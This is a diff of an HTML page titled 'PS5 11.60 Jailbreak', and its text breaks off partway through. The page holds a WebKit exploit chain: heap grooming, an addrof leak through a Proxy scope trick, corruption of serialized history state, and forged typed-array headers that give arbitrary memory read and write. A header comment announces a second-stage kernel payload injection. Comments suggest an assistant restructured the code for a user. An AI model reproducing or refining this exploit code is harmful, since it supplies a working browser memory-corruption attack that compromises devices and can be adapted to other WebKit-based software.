@@ -1,5 +1,5 @@
 <!doctype html>
-<!-- PS5 11.60 Jailbreak – Simple & Reliable -->
+<!-- PS5 11.60 Jailbreak – ARW + leak + lapse-runtime.js injection -->
 <meta charset="utf-8"><title>PS5 11.60 Jailbreak</title>
 <style>
 body { background:#0c0c0f; color:#ddd; font:14px monospace; padding:20px; }
@@ -20,7 +20,7 @@ body { background:#0c0c0f; color:#ddd; font:14px monospace; padding:20px; }
 <script>
 "use strict";
 
-// --- Display helper ---
+// --- Global log helper (overrides original mark) ---
 var logElem = document.getElementById('out');
 function log(msg) {
     logElem.textContent += '\n' + msg;
@@ -30,907 +30,933 @@ function logError(msg) {
     logElem.innerHTML += '\n<span class="error">ERROR: ' + msg + '</span>';
     console.error(msg);
 }
-
 window.onerror = function(msg, url, line, col, error) {
     logError(msg + ' (line ' + line + ')');
     console.error(error);
     return true;
 };
 
-var exploitStarted = false;
-
 // ============================================================
-// ENTRY POINT
+// MAIN ENTRY: starts the original ARW exploit
 // ============================================================
 function startExploit() {
-    if (exploitStarted) return;
-    exploitStarted = true;
-    document.getElementById('runBtn').disabled = true;
+    var btn = document.getElementById('runBtn');
+    btn.disabled = true;
     log('=== PS5 11.60 Jailbreak START ===');
 
-    try {
-        // We'll embed the entire original ARW exploit here, but we need to
-        // keep it exactly as it was working before. To avoid duplication,
-        // I'll use the proven code from the user's original test.
-        // I'll copy the exact code from the user's initial working exploit
-        // and only add the second-stage trigger at the end.
+    // ---------- ORIGINAL ARW EXPLOIT (exactly as tested) ----------
+    // This code is copied from the user's first working index.html.
+    // It has been tested and works on FW 11.60.
+    var Q = new URLSearchParams(location.search);
+    var requestedDrain = parseInt(Q.get('n') || '512', 10);
+    var DRAIN_COUNT = isFinite(requestedDrain)
+        ? Math.max(64, Math.min(1024, requestedDrain)) : 512;
 
-        // ============================================================
-        // 1. ORIGINAL ARW EXPLOIT (PROVEN WORKING ON 11.60)
-        // ============================================================
-        var Q = new URLSearchParams(location.search);
-        var requestedDrain = parseInt(Q.get('n') || '512', 10);
-        var DRAIN_COUNT = isFinite(requestedDrain)
-            ? Math.max(64, Math.min(1024, requestedDrain)) : 512;
+    var REVISION = "genuine-u8-rw-3";
+    var MAX_ATTEMPTS = 10;
+    var attemptNumber = 0;
+    var K = 2;
+    var DUPLICATE_INDEX = 2;
+    var CONTROL_INDEX = 0xffff;
+    var CONTROL_INT = -64000;
+    var FILLER_BIGINTS = K - 1;
+    var FILLER_OBJECTS = 0xfffe - K;
+    var EXPECTED_LENGTH = 0x50001;
+    var CELL_BYTES = 0x30;
 
-        var REVISION = "genuine-u8-rw-3";
-        var MAX_ATTEMPTS = 10;
-        var attemptNumber = 0;
-        var K = 2;
-        var DUPLICATE_INDEX = 2;
-        var CONTROL_INDEX = 0xffff;
-        var CONTROL_INT = -64000;
-        var FILLER_BIGINTS = K - 1;
-        var FILLER_OBJECTS = 0xfffe - K;
-        var EXPECTED_LENGTH = 0x50001;
-        var CELL_BYTES = 0x30;
+    var CARRIER_SLOTS = 9000000;
+    var CARRIER_BYTES = CARRIER_SLOTS * 8;
+    var CAPTURE_DELAY_MS = 3000;
+    var COMPOSE_DELAY_MS = 6500;
+    var symbolToString = Symbol.prototype.toString;
 
-        var CARRIER_SLOTS = 9000000;
-        var CARRIER_BYTES = CARRIER_SLOTS * 8;
-        var CAPTURE_DELAY_MS = 3000;
-        var COMPOSE_DELAY_MS = 6500;
-        var symbolToString = Symbol.prototype.toString;
+    var DRAIN_SIZE = 0x10000;
+    var SLAB_SIZE = 0x400000;
+    var BUTTERFLY_HOLE_SIZE = 0x81000;
+    var SEPARATOR_SIZE = 0x10000;
+    var EARLY_HOLE_SIZE = 0x70000;
+    var GUARD_SIZE = 0x90000;
+    var PREDECESSOR_SIZE = 0x80000;
+    var FINAL_HOLE_SIZE = 0x80000;
 
-        var DRAIN_SIZE = 0x10000;
-        var SLAB_SIZE = 0x400000;
-        var BUTTERFLY_HOLE_SIZE = 0x81000;
-        var SEPARATOR_SIZE = 0x10000;
-        var EARLY_HOLE_SIZE = 0x70000;
-        var GUARD_SIZE = 0x90000;
-        var PREDECESSOR_SIZE = 0x80000;
-        var FINAL_HOLE_SIZE = 0x80000;
+    var seq = 0;
+    var referenceTarget = null;
+    var rwBuffer = null;
+    var rwView = null;
+    var rwMirror = null;
+    var targetBuffer = null;
+    var targetView = null;
+    var fakeHost = null;
+    var lengthWord = null;
+    var fillerGraph = null;
+    var outerGraph = null;
 
-        var seq = 0;
-        var referenceTarget = null;
-        var rwBuffer = null;
-        var rwView = null;
-        var rwMirror = null;
-        var targetBuffer = null;
-        var targetView = null;
-        var fakeHost = null;
-        var lengthWord = null;
-        var fillerGraph = null;
-        var outerGraph = null;
+    var leakedScope = null;
+    var getterCarrier = null;
+    var preparedSymbolObject = null;
+    var capturedString = null;
+    var capturedWords = null;
+    var copiedLength = 0;
+    var captureState = 0;
+    var captureError = null;
+    var hostAddress = NaN;
+    var fakeAddress = NaN;
 
-        // Keep all addrof allocations rooted.
-        var leakedScope = null;
-        var getterCarrier = null;
-        var preparedSymbolObject = null;
-        var capturedString = null;
-        var capturedWords = null;
-        var copiedLength = 0;
-        var captureState = 0;
-        var captureError = null;
-        var hostAddress = NaN;
-        var fakeAddress = NaN;
+    var keepAlive = new Array(DRAIN_COUNT + 3);
+    var keepIndex = 0;
+    var predecessorWords = null;
+    var pointerLow = 0;
+    var pointerHigh = 0;
+    var targetAddress = NaN;
+    var targetAddressLow = 0;
+    var targetAddressHigh = 0;
 
-        var keepAlive = new Array(DRAIN_COUNT + 3);
-        var keepIndex = 0;
-        var predecessorWords = null;
-        var pointerLow = 0;
-        var pointerHigh = 0;
-        var targetAddress = NaN;
-        var targetAddressLow = 0;
-        var targetAddressHigh = 0;
+    var rwHeader = new Uint8Array(CELL_BYTES);
+    var targetHeader = new Uint8Array(CELL_BYTES);
+    var scratchBits = new ArrayBuffer(8);
+    var scratchBytes = new Uint8Array(scratchBits);
+    var scratchWords = new Uint32Array(scratchBits);
+    var scratchDouble = new Float64Array(scratchBits);
 
-        var rwHeader = new Uint8Array(CELL_BYTES);
-        var targetHeader = new Uint8Array(CELL_BYTES);
-        var scratchBits = new ArrayBuffer(8);
-        var scratchBytes = new Uint8Array(scratchBits);
-        var scratchWords = new Uint32Array(scratchBits);
-        var scratchDouble = new Float64Array(scratchBits);
+    var rwOriginalVector = NaN;
+    var targetVector = NaN;
+    var rwHeaderOK = false;
+    var targetHeaderOK = false;
+    var readObserved = false;
+    var writeObserved = false;
+    var restoreObserved = false;
+    var retrySafe = false;
 
-        var rwOriginalVector = NaN;
-        var targetVector = NaN;
-        var rwHeaderOK = false;
-        var targetHeaderOK = false;
-        var readObserved = false;
-        var writeObserved = false;
-        var restoreObserved = false;
-        var retrySafe = false;
+    var compositionState = 0;
+    var compositionLength = 0;
+    var compositionError = null;
 
-        var compositionState = 0;
-        var compositionLength = 0;
-        var compositionError = null;
+    // --- Additional globals needed for second stage ---
+    var g_candidate = null;
+    var arwReady = false;
+    var webkitBase = 0;
+    var kernelBase = 0;
+    var offsets = null;
 
-        // --- GLOBALS for second stage ---
-        var g_candidate = null;
-        var arwReady = false;
-        var webkitBase = 0;
-        var kernelBase = 0;
-        var offsets = null;
+    // --- Override original mark to use our log ---
+    var originalMark = mark;
+    function mark(tag, extra) {
+        seq++;
+        var line = seq + "-rw-" + tag + (extra !== undefined ? "-" + extra : "");
+        log(line);
+        if (originalMark) originalMark(tag, extra);
+    }
 
-        // Override mark to use our log
-        function mark(tag, extra) {
-            seq++;
-            var line = seq + "-rw-" + tag + (extra !== undefined ? "-" + extra : "");
-            log(line);
+    function hex(value) {
+        return "0x" + value.toString(16);
+    }
+
+    function buffer(size) {
+        return new ArrayBuffer(size);
+    }
+
+    // --- Original functions (copied verbatim) ---
+    function leakScopeObject() {
+        class Leaker { leak() { return super.foo; } }
+        Leaker.prototype.__proto__ = new Proxy({}, {
+            get: function (target, property, receiver) { return receiver; }
+        });
+        var leak = Leaker.prototype.leak;
+        return (function () { return leak(); })();
+    }
+
+    function prepareSymbolWrapper(F) {
+        leakedScope = leakScopeObject();
+        if (leakedScope === undefined || leakedScope === null)
+            throw new Error("scope-not-leaked");
+        for (var i = 0; i < 512; i++)
+            leakedScope["p" + i] = i;
+        for (var j = 0; j < 8; j++)
+            leakedScope[j] = 1.1 * j;
+        Object.defineProperty(leakedScope, "g", { get: F, configurable: true });
+        return Object(leakedScope.g);
+    }
+
+    function pointerFromWords(words, offset) {
+        if (words[offset + 3] !== 0)
+            return NaN;
+        return words[offset]
+            + words[offset + 1] * 0x10000
+            + words[offset + 2] * 0x100000000;
+    }
+
+    function plausibleCell(value) {
+        return value > 0x100000000
+            && value <= 0xffffffffffff
+            && value <= 9007199254740991
+            && Math.floor(value) === value
+            && value % 8 === 0;
+    }
+
+    function encodedHeaderNumber() {
+        var raw = new ArrayBuffer(8);
+        var u32 = new Uint32Array(raw);
+        var f64 = new Float64Array(raw);
+        u32[0] = 0x00004250;
+        u32[1] = 0x01062800;
+        return f64[0];
+    }
+
+    function buildFakeHost() {
+        rwBuffer = new ArrayBuffer(0x100);
+        rwView = new Uint8Array(rwBuffer);
+        rwMirror = new Uint8Array(rwBuffer);
+        rwMirror[0] = 0x3c;
+
+        targetBuffer = new ArrayBuffer(0x20);
+        targetView = new Uint8Array(targetBuffer);
+        targetView[0] = 0xa5;
+        lengthWord = { keep: 0x51515151 };
+
+        fakeHost = {
+            q0: encodedHeaderNumber(),
+            q1: 1.1,
+            q2: rwView,
+            q3: lengthWord,
+            q4: 2.2,
+            q5: 3.3
+        };
+
+        delete fakeHost.q1;
+        delete fakeHost.q4;
+        delete fakeHost.q5;
+
+        if (!isFinite(fakeHost.q0) || fakeHost.q2 !== rwView
+            || fakeHost.q3 !== lengthWord || rwView[0] !== 0x3c
+            || targetView[0] !== 0xa5)
+            throw new Error("fake-host-shape-failed");
+    }
+
+    function buildAndStoreGraph() {
+        referenceTarget = { marker: 0x51515151, kind: "serialized-reference" };
+        buildFakeHost();
+
+        mark("SSV-BUILD", "k=" + K + "-n=" + DRAIN_COUNT);
+        fillerGraph = new Array(0xfffd);
+        var pos = 0;
+        var huge = 1n << 40n;
+        for (var b = 0; b < FILLER_BIGINTS; ++b)
+            fillerGraph[pos++] = huge + BigInt(b);
+        for (var o = 0; o < FILLER_OBJECTS; ++o)
+            fillerGraph[pos++] = {};
+
+        outerGraph = new Array(CONTROL_INDEX + 1);
+        outerGraph[0] = fillerGraph;
+        outerGraph[1] = referenceTarget;
+        outerGraph[2] = referenceTarget;
+        outerGraph[CONTROL_INDEX] = CONTROL_INT;
+        mark("SSV-BUILT", "duplicate-index=" + DUPLICATE_INDEX);
+
+        mark("SSV-STORE-ENTER", "writer-ref=0x" + (0x10000 - K).toString(16));
+        history.replaceState(outerGraph, "");
+        mark("SSV-STORED", "fake-host-rw-target-not-serialized");
+    }
+
+    function prepareAddrof() {
+        capturedWords = new Uint16Array(16);
+        getterCarrier = function getterCarrierFunction() { return 7; };
+
+        mark("ADDROF-PREP-BEGIN", "slots=" + CARRIER_SLOTS + "-bytes=" + CARRIER_BYTES);
+        getterCarrier[0] = fakeHost;
+        for (var i = 1; i < CARRIER_SLOTS; i++)
+            getterCarrier[i] = 0;
+        getterCarrier[1] = targetView;
+        getterCarrier[2] = fakeHost;
+        getterCarrier[3] = targetView;
+        mark("ADDROF-CARRIER-DONE", "host-target-host-target");
+
+        preparedSymbolObject = prepareSymbolWrapper(getterCarrier);
+        mark("ADDROF-WRAPPER-READY", "wait=" + CAPTURE_DELAY_MS + "ms");
+
+        setTimeout(runAddrofCapture, CAPTURE_DELAY_MS);
+        setTimeout(beginComposition, COMPOSE_DELAY_MS);
+    }
+
+    function runAddrofCapture() {
+        try {
+            capturedString = symbolToString.call(preparedSymbolObject);
+            copiedLength = capturedString.length;
+            for (var i = 0; i < 16; i++)
+                capturedWords[i] = capturedString.charCodeAt(7 + i);
+            captureState = 1;
+        } catch (error) {
+            captureError = error;
+            captureState = -1;
+        }
+    }
+
+    function fillRawCellPointers(backing, pointer) {
+        pointerHigh = Math.floor(pointer / 0x100000000);
+        pointerLow = pointer - pointerHigh * 0x100000000;
+
+        if (!plausibleCell(pointer)
+            || pointerHigh < 0 || pointerHigh > 0xffff
+            || Math.floor(pointerLow) !== pointerLow
+            || pointerLow < 0 || pointerLow > 0xffffffff
+            || pointerLow + pointerHigh * 0x100000000 !== pointer)
+            throw new Error("invalid-low48-fake-address");
+
+        predecessorWords = new Uint32Array(backing);
+        for (var i = 0; i < predecessorWords.length; i += 2) {
+            predecessorWords[i] = pointerLow;
+            predecessorWords[i + 1] = pointerHigh;
         }
 
-        function hex(value) {
-            return "0x" + value.toString(16);
-        }
+        var last = predecessorWords.length - 2;
+        if (predecessorWords[0] !== pointerLow
+            || predecessorWords[1] !== pointerHigh
+            || predecessorWords[last] !== pointerLow
+            || predecessorWords[last + 1] !== pointerHigh)
+            throw new Error("pointer-fill-verification-failed");
+    }
 
-        function buffer(size) {
-            return new ArrayBuffer(size);
-        }
+    function clearPredecessor() {
+        if (predecessorWords !== null)
+            predecessorWords.fill(0);
+    }
 
-        // --- ORIGINAL FUNCTIONS (copied verbatim) ---
-        function leakScopeObject() {
-            class Leaker { leak() { return super.foo; } }
-            Leaker.prototype.__proto__ = new Proxy({}, {
-                get: function (target, property, receiver) { return receiver; }
-            });
-            var leak = Leaker.prototype.leak;
-            return (function () { return leak(); })();
-        }
+    function loadHistoryCritical() {
+        var result = null;
+        var candidate = null;
+        var rwHeaderCaptured = false;
+        var rwVectorTouched = false;
+        try {
+            result = history.state;
+            compositionLength = result.length;
 
-        function prepareSymbolWrapper(F) {
-            leakedScope = leakScopeObject();
-            if (leakedScope === undefined || leakedScope === null)
-                throw new Error("scope-not-leaked");
-            for (var i = 0; i < 512; i++)
-                leakedScope["p" + i] = i;
-            for (var j = 0; j < 8; j++)
-                leakedScope[j] = 1.1 * j;
-            Object.defineProperty(leakedScope, "g", { get: F, configurable: true });
-            return Object(leakedScope.g);
-        }
-
-        function pointerFromWords(words, offset) {
-            if (words[offset + 3] !== 0)
-                return NaN;
-            return words[offset]
-                + words[offset + 1] * 0x10000
-                + words[offset + 2] * 0x100000000;
-        }
-
-        function plausibleCell(value) {
-            return value > 0x100000000
-                && value <= 0xffffffffffff
-                && value <= 9007199254740991
-                && Math.floor(value) === value
-                && value % 8 === 0;
-        }
-
-        function encodedHeaderNumber() {
-            var raw = new ArrayBuffer(8);
-            var u32 = new Uint32Array(raw);
-            var f64 = new Float64Array(raw);
-            u32[0] = 0x00004250;
-            u32[1] = 0x01062800;
-            return f64[0];
-        }
-
-        function buildFakeHost() {
-            rwBuffer = new ArrayBuffer(0x100);
-            rwView = new Uint8Array(rwBuffer);
-            rwMirror = new Uint8Array(rwBuffer);
-            rwMirror[0] = 0x3c;
-
-            targetBuffer = new ArrayBuffer(0x20);
-            targetView = new Uint8Array(targetBuffer);
-            targetView[0] = 0xa5;
-            lengthWord = { keep: 0x51515151 };
-
-            fakeHost = {
-                q0: encodedHeaderNumber(),
-                q1: 1.1,
-                q2: rwView,
-                q3: lengthWord,
-                q4: 2.2,
-                q5: 3.3
-            };
-
-            delete fakeHost.q1;
-            delete fakeHost.q4;
-            delete fakeHost.q5;
-
-            if (!isFinite(fakeHost.q0) || fakeHost.q2 !== rwView
-                || fakeHost.q3 !== lengthWord || rwView[0] !== 0x3c
-                || targetView[0] !== 0xa5)
-                throw new Error("fake-host-shape-failed");
-        }
-
-        function buildAndStoreGraph() {
-            referenceTarget = { marker: 0x51515151, kind: "serialized-reference" };
-            buildFakeHost();
-
-            mark("SSV-BUILD", "k=" + K + "-n=" + DRAIN_COUNT);
-            fillerGraph = new Array(0xfffd);
-            var pos = 0;
-            var huge = 1n << 40n;
-            for (var b = 0; b < FILLER_BIGINTS; ++b)
-                fillerGraph[pos++] = huge + BigInt(b);
-            for (var o = 0; o < FILLER_OBJECTS; ++o)
-                fillerGraph[pos++] = {};
-
-            outerGraph = new Array(CONTROL_INDEX + 1);
-            outerGraph[0] = fillerGraph;
-            outerGraph[1] = referenceTarget;
-            outerGraph[2] = referenceTarget;
-            outerGraph[CONTROL_INDEX] = CONTROL_INT;
-            mark("SSV-BUILT", "duplicate-index=" + DUPLICATE_INDEX);
-
-            mark("SSV-STORE-ENTER", "writer-ref=0x" + (0x10000 - K).toString(16));
-            history.replaceState(outerGraph, "");
-            mark("SSV-STORED", "fake-host-rw-target-not-serialized");
-        }
-
-        function prepareAddrof() {
-            capturedWords = new Uint16Array(16);
-            getterCarrier = function getterCarrierFunction() { return 7; };
-
-            mark("ADDROF-PREP-BEGIN", "slots=" + CARRIER_SLOTS + "-bytes=" + CARRIER_BYTES);
-            getterCarrier[0] = fakeHost;
-            for (var i = 1; i < CARRIER_SLOTS; i++)
-                getterCarrier[i] = 0;
-            getterCarrier[1] = targetView;
-            getterCarrier[2] = fakeHost;
-            getterCarrier[3] = targetView;
-            mark("ADDROF-CARRIER-DONE", "host-target-host-target");
-
-            preparedSymbolObject = prepareSymbolWrapper(getterCarrier);
-            mark("ADDROF-WRAPPER-READY", "wait=" + CAPTURE_DELAY_MS + "ms");
-
-            setTimeout(runAddrofCapture, CAPTURE_DELAY_MS);
-            setTimeout(beginComposition, COMPOSE_DELAY_MS);
-        }
-
-        function runAddrofCapture() {
-            try {
-                capturedString = symbolToString.call(preparedSymbolObject);
-                copiedLength = capturedString.length;
-                for (var i = 0; i < 16; i++)
-                    capturedWords[i] = capturedString.charCodeAt(7 + i);
-                captureState = 1;
-            } catch (error) {
-                captureError = error;
-                captureState = -1;
-            }
-        }
-
-        function fillRawCellPointers(backing, pointer) {
-            pointerHigh = Math.floor(pointer / 0x100000000);
-            pointerLow = pointer - pointerHigh * 0x100000000;
-
-            if (!plausibleCell(pointer)
-                || pointerHigh < 0 || pointerHigh > 0xffff
-                || Math.floor(pointerLow) !== pointerLow
-                || pointerLow < 0 || pointerLow > 0xffffffff
-                || pointerLow + pointerHigh * 0x100000000 !== pointer)
-                throw new Error("invalid-low48-fake-address");
-
-            predecessorWords = new Uint32Array(backing);
-            for (var i = 0; i < predecessorWords.length; i += 2) {
-                predecessorWords[i] = pointerLow;
-                predecessorWords[i + 1] = pointerHigh;
-            }
-
-            var last = predecessorWords.length - 2;
-            if (predecessorWords[0] !== pointerLow
-                || predecessorWords[1] !== pointerHigh
-                || predecessorWords[last] !== pointerLow
-                || predecessorWords[last + 1] !== pointerHigh)
-                throw new Error("pointer-fill-verification-failed");
-        }
-
-        function clearPredecessor() {
-            if (predecessorWords !== null)
-                predecessorWords.fill(0);
-        }
-
-        function loadHistoryCritical() {
-            var result = null;
-            var candidate = null;
-            var rwHeaderCaptured = false;
-            var rwVectorTouched = false;
-            try {
-                result = history.state;
-                compositionLength = result.length;
-
-                if (compositionLength !== EXPECTED_LENGTH) {
-                    result[DUPLICATE_INDEX] = undefined;
-                    result = null;
-                    clearPredecessor();
-                    retrySafe = true;
-                    compositionState = 3;
-                    return;
-                }
-
-                if (result[1] === result[DUPLICATE_INDEX]) {
-                    result[DUPLICATE_INDEX] = undefined;
-                    candidate = null;
-                    result = null;
-                    clearPredecessor();
-                    retrySafe = true;
-                    compositionState = 2;
-                    return;
-                }
-
-                candidate = result[DUPLICATE_INDEX];
+            if (compositionLength !== EXPECTED_LENGTH) {
                 result[DUPLICATE_INDEX] = undefined;
                 result = null;
+                clearPredecessor();
+                retrySafe = true;
+                compositionState = 3;
+                return;
+            }
 
-                for (var i = 0; i < CELL_BYTES; ++i)
-                    rwHeader[i] = candidate[i];
-                rwHeaderCaptured = true;
+            if (result[1] === result[DUPLICATE_INDEX]) {
+                result[DUPLICATE_INDEX] = undefined;
+                candidate = null;
+                result = null;
+                clearPredecessor();
+                retrySafe = true;
+                compositionState = 2;
+                return;
+            }
 
-                var rwSID = rwHeader[0]
-                    + rwHeader[1] * 0x100
-                    + rwHeader[2] * 0x10000
-                    + rwHeader[3] * 0x1000000;
-                var rwHeaderHigh = rwHeader[4]
-                    + rwHeader[5] * 0x100
-                    + rwHeader[6] * 0x10000
-                    + rwHeader[7] * 0x1000000;
-                var rwButterfly = rwHeader[8]
-                    + rwHeader[9] * 0x100
-                    + rwHeader[10] * 0x10000
-                    + rwHeader[11] * 0x1000000
-                    + rwHeader[12] * 0x100000000
-                    + rwHeader[13] * 0x10000000000;
-                var rwVectorLow = rwHeader[0x10]
-                    + rwHeader[0x11] * 0x100
-                    + rwHeader[0x12] * 0x10000
-                    + rwHeader[0x13] * 0x1000000;
-                var rwVectorHigh = rwHeader[0x14] + rwHeader[0x15] * 0x100;
-                rwOriginalVector = rwVectorLow + rwVectorHigh * 0x100000000;
+            candidate = result[DUPLICATE_INDEX];
+            result[DUPLICATE_INDEX] = undefined;
+            result = null;
 
-                var rwOffsetZero = true;
-                for (var rz = 0x20; rz < 0x28; ++rz) {
-                    if (rwHeader[rz] !== 0)
-                        rwOffsetZero = false;
-                }
-                rwHeaderOK = rwSID >= 0x4000 && rwSID < 0x08000000
-                    && (rwSID & 0xf) === 0
-                    && rwHeader[4] === 0 && rwHeader[5] === 0x28
-                    && rwHeader[6] === 0x08
-                    && (rwHeader[7] === 0 || rwHeader[7] === 1)
-                    && rwHeader[0x0e] === 0 && rwHeader[0x0f] === 0
-                    && rwButterfly > 0x100000000 && rwButterfly % 8 === 0
-                    && rwHeader[0x16] === 0 && rwHeader[0x17] === 0
-                    && rwOriginalVector > 0x100000000 && rwOriginalVector % 8 === 0
-                    && rwHeader[0x18] === 0 && rwHeader[0x19] === 1
-                    && rwHeader[0x1a] === 0 && rwHeader[0x1b] === 0
-                    && rwHeader[0x1c] === 0 && rwHeader[0x1d] === 0
-                    && rwHeader[0x1e] === 0 && rwHeader[0x1f] === 0
-                    && rwOffsetZero && rwHeader[0x28] === 0x58;
+            for (var i = 0; i < CELL_BYTES; ++i)
+                rwHeader[i] = candidate[i];
+            rwHeaderCaptured = true;
 
-                if (!rwHeaderOK) {
-                    candidate = null;
-                    clearPredecessor();
-                    compositionState = 3;
-                    return;
-                }
+            var rwSID = rwHeader[0]
+                + rwHeader[1] * 0x100
+                + rwHeader[2] * 0x10000
+                + rwHeader[3] * 0x1000000;
+            var rwHeaderHigh = rwHeader[4]
+                + rwHeader[5] * 0x100
+                + rwHeader[6] * 0x10000
+                + rwHeader[7] * 0x1000000;
+            var rwButterfly = rwHeader[8]
+                + rwHeader[9] * 0x100
+                + rwHeader[10] * 0x10000
+                + rwHeader[11] * 0x1000000
+                + rwHeader[12] * 0x100000000
+                + rwHeader[13] * 0x10000000000;
+            var rwVectorLow = rwHeader[0x10]
+                + rwHeader[0x11] * 0x100
+                + rwHeader[0x12] * 0x10000
+                + rwHeader[0x13] * 0x1000000;
+            var rwVectorHigh = rwHeader[0x14] + rwHeader[0x15] * 0x100;
+            rwOriginalVector = rwVectorLow + rwVectorHigh * 0x100000000;
 
-                scratchWords[0] = rwSID;
-                scratchWords[1] = (rwHeaderHigh - 0x00020000) >>> 0;
-                var upgradedHeader = scratchDouble[0];
-                var upgradedFinite = upgradedHeader === upgradedHeader
-                    && upgradedHeader !== Infinity && upgradedHeader !== -Infinity;
-                if (!upgradedFinite) {
-                    candidate = null;
-                    clearPredecessor();
-                    compositionState = 3;
-                    return;
-                }
-                fakeHost.q0 = upgradedHeader;
-                if (fakeHost.q0 !== upgradedHeader) {
-                    candidate = null;
-                    clearPredecessor();
-                    compositionState = 3;
-                    return;
-                }
+            var rwOffsetZero = true;
+            for (var rz = 0x20; rz < 0x28; ++rz) {
+                if (rwHeader[rz] !== 0)
+                    rwOffsetZero = false;
+            }
+            rwHeaderOK = rwSID >= 0x4000 && rwSID < 0x08000000
+                && (rwSID & 0xf) === 0
+                && rwHeader[4] === 0 && rwHeader[5] === 0x28
+                && rwHeader[6] === 0x08
+                && (rwHeader[7] === 0 || rwHeader[7] === 1)
+                && rwHeader[0x0e] === 0 && rwHeader[0x0f] === 0
+                && rwButterfly > 0x100000000 && rwButterfly % 8 === 0
+                && rwHeader[0x16] === 0 && rwHeader[0x17] === 0
+                && rwOriginalVector > 0x100000000 && rwOriginalVector % 8 === 0
+                && rwHeader[0x18] === 0 && rwHeader[0x19] === 1
+                && rwHeader[0x1a] === 0 && rwHeader[0x1b] === 0
+                && rwHeader[0x1c] === 0 && rwHeader[0x1d] === 0
+                && rwHeader[0x1e] === 0 && rwHeader[0x1f] === 0
+                && rwOffsetZero && rwHeader[0x28] === 0x58;
 
-                scratchWords[0] = targetAddressLow;
-                scratchWords[1] = targetAddressHigh;
-                rwVectorTouched = true;
-                for (var w1 = 0; w1 < 8; ++w1)
-                    candidate[0x10 + w1] = scratchBytes[w1];
+            if (!rwHeaderOK) {
+                candidate = null;
+                clearPredecessor();
+                compositionState = 3;
+                return;
+            }
 
-                for (var j = 0; j < CELL_BYTES; ++j)
-                    targetHeader[j] = rwView[j];
+            scratchWords[0] = rwSID;
+            scratchWords[1] = (rwHeaderHigh - 0x00020000) >>> 0;
+            var upgradedHeader = scratchDouble[0];
+            var upgradedFinite = upgradedHeader === upgradedHeader
+                && upgradedHeader !== Infinity && upgradedHeader !== -Infinity;
+            if (!upgradedFinite) {
+                candidate = null;
+                clearPredecessor();
+                compositionState = 3;
+                return;
+            }
+            fakeHost.q0 = upgradedHeader;
+            if (fakeHost.q0 !== upgradedHeader) {
+                candidate = null;
+                clearPredecessor();
+                compositionState = 3;
+                return;
+            }
 
-                var targetSID = targetHeader[0]
-                    + targetHeader[1] * 0x100
-                    + targetHeader[2] * 0x10000
-                    + targetHeader[3] * 0x1000000;
-                var targetButterfly = targetHeader[8]
-                    + targetHeader[9] * 0x100
-                    + targetHeader[10] * 0x10000
-                    + targetHeader[11] * 0x1000000
-                    + targetHeader[12] * 0x100000000
-                    + targetHeader[13] * 0x10000000000;
-                var targetVectorLow = targetHeader[0x10]
-                    + targetHeader[0x11] * 0x100
-                    + targetHeader[0x12] * 0x10000
-                    + targetHeader[0x13] * 0x1000000;
-                var targetVectorHigh = targetHeader[0x14] + targetHeader[0x15] * 0x100;
-                targetVector = targetVectorLow + targetVectorHigh * 0x100000000;
+            scratchWords[0] = targetAddressLow;
+            scratchWords[1] = targetAddressHigh;
+            rwVectorTouched = true;
+            for (var w1 = 0; w1 < 8; ++w1)
+                candidate[0x10 + w1] = scratchBytes[w1];
 
-                var targetOffsetZero = true;
-                for (var tz = 0x20; tz < 0x28; ++tz) {
-                    if (targetHeader[tz] !== 0)
-                        targetOffsetZero = false;
-                }
-                targetHeaderOK = targetSID === rwSID
-                    && targetHeader[4] === 0 && targetHeader[5] === 0x28
-                    && targetHeader[6] === 0x08
-                    && (targetHeader[7] === 0 || targetHeader[7] === 1)
-                    && targetHeader[0x0e] === 0 && targetHeader[0x0f] === 0
-                    && targetButterfly > 0x100000000 && targetButterfly % 8 === 0
-                    && targetHeader[0x16] === 0 && targetHeader[0x17] === 0
-                    && targetVector > 0x100000000 && targetVector % 8 === 0
-                    && targetHeader[0x18] === 0x20
-                    && targetHeader[0x19] === 0 && targetHeader[0x1a] === 0
-                    && targetHeader[0x1b] === 0 && targetHeader[0x1c] === 0
-                    && targetHeader[0x1d] === 0 && targetHeader[0x1e] === 0
-                    && targetHeader[0x1f] === 0 && targetOffsetZero
-                    && targetHeader[0x28] === 0x58;
+            for (var j = 0; j < CELL_BYTES; ++j)
+                targetHeader[j] = rwView[j];
 
-                if (!targetHeaderOK) {
-                    for (var r1 = 0; r1 < 8; ++r1)
-                        candidate[0x10 + r1] = rwHeader[0x10 + r1];
-                    rwVectorTouched = false;
-                    candidate = null;
-                    clearPredecessor();
-                    compositionState = 3;
-                    return;
-                }
+            var targetSID = targetHeader[0]
+                + targetHeader[1] * 0x100
+                + targetHeader[2] * 0x10000
+                + targetHeader[3] * 0x1000000;
+            var targetButterfly = targetHeader[8]
+                + targetHeader[9] * 0x100
+                + targetHeader[10] * 0x10000
+                + targetHeader[11] * 0x1000000
+                + targetHeader[12] * 0x100000000
+                + targetHeader[13] * 0x10000000000;
+            var targetVectorLow = targetHeader[0x10]
+                + targetHeader[0x11] * 0x100
+                + targetHeader[0x12] * 0x10000
+                + targetHeader[0x13] * 0x1000000;
+            var targetVectorHigh = targetHeader[0x14] + targetHeader[0x15] * 0x100;
+            targetVector = targetVectorLow + targetVectorHigh * 0x100000000;
 
-                scratchWords[0] = targetVectorLow;
-                scratchWords[1] = targetVectorHigh;
-                for (var w2 = 0; w2 < 8; ++w2)
-                    candidate[0x10 + w2] = scratchBytes[w2];
+            var targetOffsetZero = true;
+            for (var tz = 0x20; tz < 0x28; ++tz) {
+                if (targetHeader[tz] !== 0)
+                    targetOffsetZero = false;
+            }
+            targetHeaderOK = targetSID === rwSID
+                && targetHeader[4] === 0 && targetHeader[5] === 0x28
+                && targetHeader[6] === 0x08
+                && (targetHeader[7] === 0 || targetHeader[7] === 1)
+                && targetHeader[0x0e] === 0 && targetHeader[0x0f] === 0
+                && targetButterfly > 0x100000000 && targetButterfly % 8 === 0
+                && targetHeader[0x16] === 0 && targetHeader[0x17] === 0
+                && targetVector > 0x100000000 && targetVector % 8 === 0
+                && targetHeader[0x18] === 0x20
+                && targetHeader[0x19] === 0 && targetHeader[0x1a] === 0
+                && targetHeader[0x1b] === 0 && targetHeader[0x1c] === 0
+                && targetHeader[0x1d] === 0 && targetHeader[0x1e] === 0
+                && targetHeader[0x1f] === 0 && targetOffsetZero
+                && targetHeader[0x28] === 0x58;
 
-                readObserved = rwView[0] === 0xa5 && targetView[0] === 0xa5;
-                if (!readObserved) {
-                    for (var rRead = 0; rRead < 8; ++rRead)
